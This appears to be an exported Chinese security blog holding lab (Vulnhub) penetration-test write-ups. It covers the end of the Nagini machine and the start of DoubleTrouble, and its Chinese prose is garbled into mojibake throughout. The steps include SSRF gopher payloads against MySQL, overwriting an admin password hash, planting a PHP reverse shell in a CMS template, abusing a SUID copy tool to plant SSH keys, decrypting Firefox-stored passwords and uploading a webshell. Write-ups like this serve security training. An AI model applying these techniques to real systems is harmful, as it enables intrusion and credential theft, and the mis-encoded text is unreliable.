<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422172803.png" /></p>
<p>è¿™é‡Œå…¶å®å¾—åˆ°ä¸¤æ¡ä¿¡æ¯ï¼š</p>
<ul>
<li>è®©æˆ‘ä»¬è®¿é—®/internalResourceFeTcher.php</li>
<li>è®©æˆ‘ä»¬æŸ¥çœ‹é…ç½®æ–‡ä»¶çš„å¤‡ä»½ï¼ŒåŠconfigruation.php.bakã€‚ä¸Šé¢çœ‹è¿‡çš„</li>
</ul>
<hr />
<p>å¦‚æœrustcæŠ¥é”™ï¼Œå…ˆå¸è½½å½“å‰çš„ï¼Œç„¶åä¸‹è½½ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¸è½½: sudo apt purge rustc</span><br><span class="line">ä¸‹è½½: </span><br><span class="line">	curl --proto &#x27;=https&#x27; --tlsv1.2 -sSf https://sh.rustup.rs | sh</span><br><span class="line">	å¼¹å‡ºäº’åŠ¨ï¼Œè¾“å…¥1</span><br><span class="line">	ç„¶åè¾“å…¥ï¼šsource $HOME/.cargo/env</span><br></pre></td></tr></table></figure></p>
<hr />
<h2 id="ssrf-mysql">SSRF + MySql</h2>
<p>ç›´æ¥è®¿é—®ï¼š10.0.2.22/internalResourceFeTcher.php</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422172743.png" /></p>
<p>ç»è¿‡æµ‹è¯•å‘ç°ï¼Œè¿™é‡Œå­˜åœ¨ç€SSRFæ¼æ´ã€‚åˆæ ¹æ®æç¤ºï¼ŒæŸ¥çœ‹é…ç½®æ–‡ä»¶ï¼Œå‘ç°é‡Œé¢æœ‰MySQLæ•°æ®åº“çš„ç›¸å…³ä¿¡æ¯ï¼Œå› æ­¤çŒœæµ‹è¿™é‡Œåº”è¯¥ä½¿ç”¨SSRFæ”»å‡»MySqlæ•°æ®åº“ï¼Œä»è€Œè·å–æ•°æ®åº“ä¸­çš„ä¿¡æ¯ã€‚</p>
<p>åˆ©ç”¨å·¥å…·ï¼š<a href="https://github.com/tarunkant/Gopherus">GitHub - tarunkant/Gopherus: This tool generates gopher link for exploiting SSRF and gaining RCE in various servers</a></p>
<p>ä½¿ç”¨æ–¹å¼å¾ˆç®€å•ï¼š<code>./gopherus.py --exploit mysql</code>ï¼Œå¦‚æœæ˜¯ä¸åŒçš„æ•°æ®åº“ï¼Œåé¢ä¿®æ”¹ä¸€ä¸‹å°±å¯ä»¥</p>
<h3 id="æŸ¥çœ‹æ•°æ®åº“ä¸­æœ‰å“ªäº›è¡¨">æŸ¥çœ‹æ•°æ®åº“ä¸­æœ‰å“ªäº›è¡¨</h3>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422173341.png" /></p>
<p>ç„¶åå°†ç”Ÿæˆçš„urlç²˜è´´åˆ°ç½‘é¡µä¸­çš„è¾“å…¥æ¡†ï¼Œè¿™é‡Œå¯èƒ½ä¼šä¸æˆåŠŸï¼Œå¤šåˆ·æ–°å‡ æ¬¡å°±å¥½äº†</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422173441.png" /></p>
<p>å‘ç°joomlaæ•°æ®åº“ä¸‹æœ‰è®¸å¤šçš„è¡¨ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨ä¸€ä¸ªå«åš<code>joomla_users</code>çš„è¡¨ï¼Œè¿™é‡Œæœ€æœ‰å¯èƒ½å­˜åœ¨ç€ç”¨æˆ·çš„ç™»å½•ä¿¡æ¯ã€‚</p>
<h3 id="æŸ¥çœ‹è¡¨ä¸‹çš„å­—æ®µ">æŸ¥çœ‹è¡¨ä¸‹çš„å­—æ®µ</h3>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422173716.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422174138.png" /></p>
<p>defåé¢è·Ÿç€çš„åˆ†åˆ«æ˜¯â€œæ•°æ®åº“ã€è¡¨åã€å­—æ®µåâ€è¿™äº›ä¿¡æ¯ã€‚å¦‚æœçœ‹çš„ä¸æ¸…æ¥šå¯ä»¥æŒ‰F12ç„¶åæŸ¥çœ‹</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422174354.png" /></p>
<p>æˆ‘ä»¬åªéœ€è¦å…³æ³¨æœ‰ä¸€ä¸ªå­—æ®µä¸ºemailï¼Œå…¶åä¸€ä¸ªå­—æ®µä¸ºå¯†ç ï¼Œå…¶å‰ä¸€ä¸ªå­—æ®µä¸ºusernameã€‚å› æ­¤<code>site_admin@nagini,hogwarts</code>è¿™ä¸ªåº”è¯¥æ˜¯emailï¼Œé‚£ä¹ˆåé¢è·Ÿç€çš„å°±æ˜¯å¯†ç ï¼Œå‰é¢å°±æ˜¯ç”¨æˆ·åsite_adminã€‚å¯ä»¥å°è¯•ç ´è§£è¯¥å¯†ç ï¼Œä½†æ˜¯å¹¶ä¸æ¨èï¼Œè¿™é‡Œæ¨èç›´æ¥ä¿®æ”¹æ‰site_adminçš„å¯†ç ã€‚</p>
<h3 id="ä¿®æ”¹site_adminå¯†ç ">ä¿®æ”¹site_adminå¯†ç </h3>
<p>å…ˆç”Ÿæˆä¸€ä¸ªmd5çš„å¯†ç ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(hdfzzfã‰¿kali)-[~]</span><br><span class="line">â””â”€$ echo -n &quot;pass&quot; | md5sum</span><br><span class="line">1a1dc91c907325c69271ddf0c944bc72  -</span><br></pre></td></tr></table></figure></p>
<p>æ³¨æ„ï¼Œä¸€å®šè¦åŠ -nã€‚ç„¶å</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422175005.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422175046.png" /></p>
<p>ç„¶åå»10.0.2.22/joomla/administrator/index.phpï¼Œç”¨ä¿®æ”¹åçš„å¯†ç ç™»å½•ã€‚</p>
<h2 id="get-shell">get shell</h2>
<p>è¿›å…¥åå°ä¹‹åå¦‚ä½•get shellå¯ä»¥æŸ¥çœ‹ï¼š<a href="4.%20Vulnhub%20AdmX%20Writeup.md">4. Vulnhub AdmX Writeup</a></p>
<p>ç›´æ¥å¯»æ‰¾æ¨¡æ¿ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Templates -&gt; Templates -&gt; [éšä¾¿é€‰ä¸€ä¸ª] -&gt; [éšä¾¿é€‰ä¸€ä¸ªphpæ–‡ä»¶]</span><br></pre></td></tr></table></figure></p>
<p>å°†<code>/usr/share/webshells/php/php-reverse-shell.php</code>çš„å†…å®¹ä»£æ›¿åŸæ¥phpçš„å†…å®¹ï¼Œæ³¨æ„ä¿®æ”¹ipå’Œç«¯å£ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422175900.png" /></p>
<p>å¯ä»¥åˆ©ç”¨dirsearchæ‰¾åˆ°å¯¹åº”phpæ–‡ä»¶çš„è·¯å¾„ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422180121.png" /></p>
<p>kaliç›‘å¬å¯¹åº”çš„ç«¯å£ï¼Œç„¶åç½‘é¡µè®¿é—®è¯¥æ–‡ä»¶</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422180226.png" /></p>
<h2 id="æƒé™æå‡">æƒé™æå‡</h2>
<h3 id="è·å¾—snapeç”¨æˆ·æƒé™">è·å¾—snapeç”¨æˆ·æƒé™</h3>
<p>å‘ç°é¶æœºä¸Šå­˜åœ¨ä¸‰ä¸ªç”¨æˆ·root, hermoine, snapeã€‚å…ˆæŸ¥çœ‹snapeçš„å®¶ç›®å½•ï¼Œå‘ç°æœ‰ä¸€ä¸ªå¥‡æ€ªçš„æ–‡ä»¶ .creds.txtï¼Œè¿™çœ‹ä¸Šå»ä¼šåƒæ˜¯ä¸€ä¸ªå£ä»¤ï¼Œå› æ­¤æŸ¥çœ‹å†…å®¹ï¼Œå‘ç°æ˜¯ç»è¿‡base64ç¼–ç çš„ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// .creds.txt</span><br><span class="line">TG92ZUBsaWxseQ==</span><br><span class="line">-&gt; Love@lilly</span><br></pre></td></tr></table></figure></p>
<p>çŒœæµ‹è¿™å¯èƒ½æ˜¯sshç™»å½•çš„å¯†ç ï¼Œå°è¯•ç™»å½•</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422194046.png" /></p>
<p>æˆåŠŸç™»å½•ã€‚</p>
<h3 id="è·å¾—hermoineç”¨æˆ·æƒé™">è·å¾—hermoineç”¨æˆ·æƒé™</h3>
<p>å…ˆåˆ°å¯¹åº”çš„å®¶ç›®å½•ï¼ŒæŸ¥çœ‹å†…å®¹ã€‚å‘ç°äº†ä¸‰ä¸ªæ¯”è¾ƒå¥‡æ€ªçš„ç‚¹ï¼š</p>
<ol type="1">
<li>å®¶ç›®å½•ä¸‹å­˜åœ¨ç€.sshç›®å½•ï¼Œå¦‚æœå­˜åœ¨sshå¯†é’¥ç™»å½•ï¼Œé‚£ä¹ˆå¯¹åº”çš„å…¬é’¥å°±ä¼šä¿å­˜åœ¨è¯¥ç›®å½•ä¸‹ã€‚ä½†æ˜¯ç°åœ¨é‡Œé¢ä¸ºç©ºï¼›</li>
<li>å®¶ç›®å½•ä¸‹å±…ç„¶æœ‰ä¸€ä¸ªbinç›®å½•ï¼Œè¿™ä¸åº”è¯¥åœ¨è¿™ï¼Œè€Œä¸”é‡Œé¢çš„æ–‡ä»¶å±…ç„¶æœ‰suidæƒé™ï¼Œå±ä¸»ä¸ºhermoineï¼Œå¹¶ä¸”æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼Œåˆæ­¥çŒœæµ‹åˆ©ç”¨è¯¥æ–‡ä»¶è·å¾—hermoineçš„æƒé™ï¼›</li>
<li>è¿˜æœ‰ä¸€ä¸ªå¥‡æ€ªçš„ç›®å½•.mozillaï¼Œè¿™æ˜¯ç«ç‹æµè§ˆå™¨çš„ç›®å½•ï¼Œä½†æ˜¯ç°åœ¨æ²¡æœ‰æƒé™æŸ¥çœ‹ï¼›</li>
</ol>
<p>å…ˆå»çœ‹ä¸€ä¸‹suidæ–‡ä»¶çš„ä½œç”¨</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422194531.png" /></p>
<p>å‘ç°è¿™å°±æ˜¯ä¸€ä¸ªå°†ç›®æ ‡æ–‡ä»¶cpåˆ°å¦ä¸€ä¸ªåœ°æ–¹çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œç»“åˆ.sshç›®å½•ï¼ŒçŒœæµ‹ï¼š<strong>åˆ©ç”¨è¯¥ç¨‹åºå°†sshå…¬é’¥æ”¾å…¥åˆ°hermoineçš„.sshç›®å½•ä¸‹ï¼Œç„¶åä½¿ç”¨sshå¯†é’¥ç™»å½•</strong></p>
<p>åœ¨kaliä¸Šç”Ÿæˆsshå…¬ã€ç§é’¥ï¼ˆæ³¨æ„ï¼Œkaliå“ªä¸ªç”¨æˆ·ç”Ÿæˆçš„å°±ç”¨å“ªä¸ªç”¨æˆ·ç™»å½•ï¼ï¼ï¼ï¼‰ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line">è¾“å…¥å‘½ä»¤ä¹‹åï¼Œä¸€ç›´å›è½¦å°±å¥½äº†</span><br></pre></td></tr></table></figure></p>
<p>å°†å…¬é’¥å‘é€åˆ°snapeç”¨æˆ·çš„ç›®å½•é‡Œå» <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scp id_rsa.pub snape@10.0.2.22:~/ <span class="comment"># æ‹·è´æ–‡ä»¶åˆ°å¯¹åº”</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422195004.png" /></p>
<p>ç„¶ååˆ©ç”¨ su_cp å°†å…¬é’¥å¤åˆ¶åˆ°/home/hermoine/.sshç›®å½•ä¸‹ï¼Œå¹¶ä¸”åå­—ä¸€å®šè¦æ”¹ä¸ºauthorized_keysï¼ï¼ï¼å¦åˆ™æ— æ³•ç™»å½•ï¼Œæˆ‘å°è¯•è¿‡ï¼</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422195336.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422195515.png" /></p>
<p>å…¶ä»–å°è¯•è¿‡ï¼Œéƒ½ä¸èƒ½ç™»å½•ã€‚</p>
<p>ç„¶ååˆ©ç”¨å¯†é’¥ç™»å½•å³å¯</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422195550.png" /></p>
<h3 id="è·å¾—rootæƒé™">è·å¾—rootæƒé™</h3>
<p>è¿™å°é¶æœºåˆ©ç”¨çš„æ–¹å¼æ¯”è¾ƒå¥‡æ€ªã€‚è¿˜è®°å¾—åˆšåˆšåœ¨hermoineç›®å½•ä¸‹çš„.mozillaå—ï¼Œé‡Œé¢ä¿å­˜çš„éƒ½æ˜¯ä¸€äº›ç«ç‹æµè§ˆå™¨ç›¸å…³çš„ä¿¡æ¯ï¼Œå½“ç„¶ä¹ŸåŒ…æ‹¬ä¸€äº›ç™»å½•ä¿¡æ¯ã€‚</p>
<p>è¿›å…¥åˆ°.mozilla/firefox/g2mhbq0o.defaultç›®å½•å†…ï¼Œå‘ç°æœ‰logins.jsonå’Œkey4.dbæ–‡ä»¶ï¼Œåˆ©ç”¨å·¥å…·æå–å‡ºé‡Œé¢çš„ä¿¡æ¯ï¼Œå·¥å…·åœ°å€ï¼š<a href="https://github.com/lclevy/firepwd">GitHub - lclevy/firepwd: firepwd.py, an open source tool to decrypt Mozilla protected passwords</a></p>
<p>è¯¥å·¥å…·çš„ä½œç”¨ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This educational tool was written to illustrate how Mozilla passwords (Firefox, Thunderbird) are protected using contents of files key4.db (or key3.db), logins.json (or signons.sqlite)</span><br></pre></td></tr></table></figure></p>
<p>å°†logins.jsonå’Œkey4.dbæ–‡ä»¶ä¸firepwd.pyæ”¾åˆ°åŒä¸€ä¸ªç›®å½•ä¸‹ï¼Œç„¶åæ‰§è¡Œ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 firepwd.py</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422200531.png" /></p>
<p>å¾—åˆ°ç”¨æˆ·åå’Œå¯†ç ï¼Œç›´æ¥sshç™»å½•</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422200625.png" /></p>
<p>æˆåŠŸè·å¾—rootæƒé™ï¼Œç°åœ¨ä¾æ¬¡æŸ¥çœ‹ä¸‰ä¸ªflagï¼Œåˆ†åˆ«æ˜¯ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// /var/www/html/horcrux1.txt</span><br><span class="line">horcrux_&#123;MzogU2x5dGhFcmlOJ3MgTG9jS0VldCBkRXN0cm9ZZUQgYlkgUm9O&#125;</span><br><span class="line">-&gt; horcrux_&#123;3: SlythEriN&#x27;s LocKEet dEstroYeD bY RoN&#125;</span><br><span class="line"></span><br><span class="line">// /home/hermoine/horcrux2.txt</span><br><span class="line">horcrux_&#123;NDogSGVsZ2EgSHVmZmxlcHVmZidzIEN1cCBkZXN0cm95ZWQgYnkgSGVybWlvbmU=&#125;</span><br><span class="line">-&gt; horcrux_&#123;4: Helga Hufflepuff&#x27;s Cup destroyed by Hermione&#125;</span><br><span class="line"></span><br><span class="line">// /root/horcrux3.txt</span><br><span class="line">  ____                            _         _       _   _                 </span><br><span class="line"> / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___ </span><br><span class="line">| |   / _ \| &#x27;_ \ / _` | &#x27;__/ _` | __| | | | |/ _` | __| |/ _ \| &#x27;_ \/ __|</span><br><span class="line">| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \</span><br><span class="line"> \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/</span><br><span class="line">                  |___/                                                   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Machine Author: Mansoor R (@time4ster)</span><br><span class="line">Machine Difficulty: Medium</span><br><span class="line">Machine Name: Nagini</span><br><span class="line">Horcruxes Hidden in this VM: 3 horcruxes</span><br><span class="line"></span><br><span class="line">You have successfully pwned Nagini machine.</span><br><span class="line">Here is your third hocrux: horcrux_&#123;NTogRGlhZGVtIG9mIFJhdmVuY2xhdyBkZXN0cm95ZWQgYnkgSGFycnk=&#125;</span><br><span class="line">-&gt; horcrux_&#123;5: Diadem of Ravenclaw destroyed by Harry&#125;</span><br><span class="line"></span><br><span class="line"># For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com</span><br></pre></td></tr></table></figure></p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>è¯¥é¶æœºéš¾åº¦æŒºå¤§çš„ï¼Œä¸»è¦æ˜¯æ¶‰åŠåˆ°è®¸å¤šæ²¡è§è¿‡çš„çŸ¥è¯†ç‚¹ï¼š</p>
<ul>
<li>Gopher + SSRF</li>
<li>HTTP3åè®®</li>
<li>æµè§ˆå™¨å¯†ç è¿˜åŸ</li>
</ul>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>ç»¼åˆ</tag>
        <tag>vulnhub</tag>
        <tag>SSRF</tag>
        <tag>HTTP3åè®®</tag>
        <tag>Gopher</tag>
        <tag>æµè§ˆå™¨å¯†ç è¿˜åŸ</tag>
      </tags>
  </entry>
  <entry>
    <title>13 Vulnhub DoubleTrouble Writeup</title>
    <url>/2022/04/18/13%20Vulnhub%20DoubleTrouble%20Writeup/</url>
    <content><![CDATA[<p>è¯¥é¶æœºéš¾åº¦ä¸ºç®€å•ï¼Œæ¼æ´å…¶å®éƒ½ä¸éš¾å‘ç°ï¼Œä¸»è¦çš„éš¾ç‚¹åœ¨äºç¬¬ä¸€å°é¶æœºéšå†™å›¾ç‰‡çš„å‘ç°å’Œç ´è§£ä»¥åŠç¬¬äºŒå°é¶æœºçš„sqlæ³¨å…¥æ¼æ´çš„å‘ç°ã€‚</p>
<span id="more"></span>
<h1 id="é¶æœºä¿¡æ¯">1 é¶æœºä¿¡æ¯</h1>
<p>é¶æœºåœ°å€ï¼š</p>
<ul>
<li>https://www.vulnhub.com/entry/doubletrouble-1,743/</li>
</ul>
<p>éš¾åº¦ï¼š</p>
<ul>
<li>ç®€å•</li>
</ul>
<p>ç›®æ ‡ï¼š</p>
<ul>
<li>å–å¾—ä¸¤å°é¶æœºrootæƒé™</li>
<li>æ‹¿åˆ°ä¸¤ä¸ªflag</li>
</ul>
<p>æ¶‰åŠæ”»å‡»æ–¹æ³•ï¼š</p>
<ul>
<li>ä¸»æœºå‘ç°</li>
<li>ç«¯å£æ‰«æ</li>
<li>Webä¿¡æ¯æ”¶é›†</li>
<li>å¼€æºCMSæ¼æ´åˆ©ç”¨</li>
<li>æ–‡ä»¶ä¸Šä¼ </li>
<li>éšå†™æœ¯</li>
<li>å¯†ç çˆ†ç ´</li>
<li>GTFObinsææƒ</li>
<li>SQLç›²æ³¨</li>
<li><strong>è„ç‰›ææƒ</strong></li>
</ul>
<h1 id="æ¸—é€ç¬¬ä¸€å°é¶æœº">2 æ¸—é€â€”â€”ç¬¬ä¸€å°é¶æœº</h1>
<p>æ”»å‡»ä¸»æœºkali: 10.0.2.4</p>
<h2 id="ä¸»æœºå‘ç°ç«¯å£æ‰«æç«¯å£æœåŠ¡å‘ç°">2.1 ä¸»æœºå‘ç°ã€ç«¯å£æ‰«æã€ç«¯å£æœåŠ¡å‘ç°</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.17</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.17</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418091054.png" /></p>
<p>å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š</p>
<ul>
<li>22ç«¯å£çš„æœåŠ¡ä¸ºssh</li>
<li>80ç«¯å£çš„æœåŠ¡ä¸ºhttpï¼Œç‰ˆæœ¬ä¸ºApache2.4.38</li>
<li>é¶æœºæ“ä½œç³»ç»Ÿä¸ºDebian</li>
</ul>
<h2 id="è®¿é—®httpæœåŠ¡">2.2 è®¿é—®httpæœåŠ¡</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418091209.png" /></p>
<p>å¾—åˆ°ä¸€ä¸ªç™»é™†ç•Œé¢ï¼Œç»å°è¯•ï¼Œå‘ç°ä¸çŸ¥é“é‚®ç®±æ— æ³•ç™»å½•ï¼Œä¹Ÿä¸å­˜åœ¨sqlæ³¨å…¥ã€‚ä½†æ˜¯ä¸‹é¢çš„ä¸¤è¡Œå†…å®¹å¾ˆå¥‡æ€ªï¼Œç‚¹å‡»å‘ç°æ¥åˆ°äº†<code>qdPM</code>å®˜ç½‘ï¼Œå‘ç°ï¼Œè¿™æ˜¯ä¸€ä¸ªå¼€æºçš„CMSï¼Œæœ€æ–°çš„ç‰ˆæœ¬æ˜¯9.2ï¼Œè€Œé¶æœºçš„æ˜¯9.1ï¼Œå› è€ŒæŸ¥çœ‹äº†ä¸€ä¸‹æ›´æ–°æ—¥å¿—ï¼Œé™¤äº†æ‰¾åˆ°å‡ ä¸ªè·¯å¾„ä¹‹å¤–ï¼ˆè·¯å¾„æ‰«æä¹Ÿèƒ½æ‰«å‡ºæ¥ï¼‰ï¼Œæ²¡æœ‰å…¶ä»–æ”¶è·ã€‚</p>
<blockquote>
<p>æ‰¾åˆ°å¼€æºCMSçš„æ—¶å€™ï¼Œéœ€è¦æŸ¥çœ‹ä¸€ä¸‹æ›´æ–°çš„è®°å½•ï¼Œé‡Œé¢æœ‰æ—¶å€™ä¼šè®°è½½ç±»ä¼¼â€œä¿®å¤äº†xxxæ¼æ´â€ä¿¡æ¯ã€‚</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418091401.png" /></p>
<p>æœç´¢äº†ä¸€ä¸‹è¯¥CMSçš„é»˜è®¤è´¦å·å¯†ç å¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin@localhost.com</span><br><span class="line">admin</span><br></pre></td></tr></table></figure></p>
<p>ä½†æ˜¯æ— æ³•ç™»å½•ã€‚å»GitHubä¸Šæ‰¾äº†æºç ï¼Œä½†æ˜¯æ£€æŸ¥äº†æ‰€æœ‰æ–‡ä»¶å‘ç°éƒ½æ²¡æœ‰ä»»ä½•æœ‰ç”¨çš„ä¿¡æ¯ï¼Œé“¾æ¥å¦‚ä¸‹ï¼š</p>
<ul>
<li>https://github.com/dodiksunaryo/qdpm</li>
</ul>
<p>æœ€åï¼Œè¿˜æ˜¯è¿›è¡Œè·¯å¾„æ‰«æï¼Œå‘ç°äº†è®¸å¤šæ–‡ä»¶ï¼ˆåœ¨æŸ¥çœ‹æºç çš„æ—¶å€™ä¹Ÿçœ‹åˆ°äº†ï¼‰</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418091804.png" /></p>
<p>ä¸€ä¸€æŸ¥çœ‹ä¹‹åè¿˜æ˜¯æ²¡æœ‰ä»€ä¹ˆä¿¡æ¯ã€‚<code>/secret</code>ä¸­æ”¾ç€ä¸€å¼ å›¾ç‰‡ï¼Œæœ¬æ¥æ²¡ä»€ä¹ˆé‡è¦çš„ï¼Œä½†æ˜¯è¿™ä¸ªç›®å½•çš„åå­—åƒæ˜¯ä¸€ä¸ªæç¤ºï¼Œå› æ­¤è”æƒ³åˆ°å¯èƒ½è¿™å¼ å›¾ç‰‡ç»è¿‡äº†éšå†™ï¼</p>
<h2 id="éšå†™æœ¯å¯†ç ç ´è§£">2.3 éšå†™æœ¯å¯†ç ç ´è§£</h2>
<p>é¦–å…ˆå°†å›¾ç‰‡ä¸‹è½½åˆ°kaliï¼Œç„¶åä½¿ç”¨<code>steghide</code>è¿›è¡ŒæŸ¥çœ‹</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418092027.png" /></p>
<p>å‘ç°éœ€è¦è¾“å…¥å¯†ç ï¼Œå› æ­¤è¿›è€Œç¡®å®šè¯¥å›¾ç‰‡éšå†™äº†æŸäº›å†…å®¹ã€‚æ­¤æ—¶åˆ©ç”¨ä¸€æ¬¾æ–°çš„å·¥å…·<code>stegseek</code>ï¼Œå®˜ç½‘ï¼š</p>
<ul>
<li>https://github.com/RickdeJager/stegseek</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">stegseek --seed doubletrouble.jpg <span class="comment"># æ£€æµ‹ä¿¡æ¯</span></span><br><span class="line">stegseek --crack doubletrouble.jpg rockyou.txt <span class="comment"># æå–ä¿¡æ¯</span></span><br></pre></td></tr></table></figure>
<p>æœ€åå¾—åˆ°ä¸€ä¸ªæ–‡ä»¶<code>doubletrouble.jpg.out</code>ï¼ŒæŸ¥çœ‹å…¶ä¸­çš„å†…å®¹ï¼Œå¾—åˆ°ä¸¤ä¸²å­—ç¬¦ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">otisrush@localhost.com</span><br><span class="line">otis666</span><br></pre></td></tr></table></figure></p>
<p>çœ‹è¿™ä¸ªæ ¼å¼åƒæ˜¯ä¹‹å‰ç™»å½•ç•Œé¢çš„é‚®ç®±å’Œå¯†ç ï¼Œå°è¯•ç™»é™†ï¼Œå‘ç°è¿›å…¥äº†åå°ï¼</p>
<h2 id="get-shell">2.4 get shell</h2>
<p>è¿™é‡Œæœ‰ä¸¤ç§åŠæ³•ï¼š</p>
<ul>
<li>ç¬¬ä¸€ç§ï¼Œåˆ©ç”¨msfæœç´¢<code>searchsploit qdpm 9.1</code>ï¼Œç„¶åä½¿ç”¨çº¢æ¡†çš„expå³å¯ï¼ˆçº¢æ¡†çš„æ˜¯æœ€æ–°çš„ï¼Œä½†æ˜¯å’Œå‰ä¸€ä¸ªåˆ©ç”¨çš„æ˜¯ä¸€æ ·çš„æ¼æ´ã€‚ä¸è¿‡ä»£ç æœ‰ç‚¹ä¹±ï¼Œéœ€è¦è‡ªå·±æ•´ç†ä¸€ä¸‹ï¼‰ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418092814.png" /></li>
<li>ç¬¬äºŒç§ï¼Œåœ¨åå°æˆ‘ä¹Ÿæ‰¾åˆ°äº†å¯¹åº”çš„æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œå¯ä»¥ç›´æ¥ä¸Šä¼ åé—¨ï¼Œæ²¡æœ‰ä»»ä½•æ‹¦æˆª</li>
</ul>
<p>æ¥ä¸‹æ¥ä¸»è¦ä»‹ç»ç¬¬äºŒç§ï¼Œç¬¬ä¸€ç§å¾ˆç®€å•ï¼Œä¿®æ”¹ä¸€ä¸‹ä»£ç ä¼ åˆ°é¶æœºæ‰§è¡Œå°±å¯ä»¥äº†ã€‚</p>
<p>è¿›å…¥åå°ä¹‹åï¼Œæˆ‘é¦–å…ˆæŸ¥çœ‹äº†é…ç½®é‡Œé¢çš„ä¿¡æ¯ï¼Œå‘ç°äº†ç–‘ä¼¼æ–‡ä»¶ä¸Šä¼ ç‚¹</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418093052.png" /></p>
<p>ç„¶åæˆ‘ä¸Šä¼ äº†ä¸€ä¸ªphpæ–‡ä»¶ï¼Œæç¤ºå¦‚ä¸‹</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418093153.png" /></p>
<p>ä½†æ˜¯é—®é¢˜æ˜¯ï¼Œæ²¡ç»™ä¸Šä¼ æ–‡ä»¶çš„è·¯å¾„ã€‚è¿™æ—¶å€™æˆ‘æƒ³åˆ°äº†è·¯å¾„æ‰«æçš„æ—¶å€™æ‰«åˆ°äº†ä¸€ä¸ª<code>/uploads</code>ï¼Œå°±å»æŸ¥çœ‹äº†ä¸€ä¸‹ï¼ŒåŠŸå¤«ä¸è´Ÿæœ‰å¿ƒäººï¼Œç»ˆäºè¢«æˆ‘æ‰¾åˆ°äº†ï¼Œåœ¨<code>10.0.2.17/uploads/users</code>é‡Œé¢æ”¾ç€ä¸Šä¼ çš„æ–‡ä»¶ï¼ˆæˆ‘è¿˜ä»¥ä¸ºä¸æˆåŠŸï¼Œä¸Šä¼ äº†è®¸å¤šæ¬¡ï¼‰</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418093326.png" /></p>
<p>æ¥ä¸‹æ¥ç›´æ¥èšå‰‘ä¸Šçº¿å³å¯ã€‚</p>
<h2 id="æƒé™æå‡">2.5 æƒé™æå‡</h2>
